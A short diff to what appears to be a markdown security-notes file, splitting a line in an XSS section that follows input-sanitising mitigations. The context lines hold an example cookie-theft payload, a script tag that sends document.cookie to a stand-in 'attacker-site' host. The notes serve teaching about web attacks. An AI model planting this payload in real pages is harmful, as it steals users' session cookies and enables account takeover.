@@ -58,7 +58,8 @@ Mitigation
 - Sanitize user input
 - Remove `script` tag when saving in database
 ### XSS
-Attacker tries to gain information by injecting javascript in the target website. This can result in
+Attacker tries to gain information by injecting javascript in the target website. 
+This can result in
 - Cookie theft
     ```bash
     <script>window.location='http://attacker-site/?cookie='+document.cookie</script>
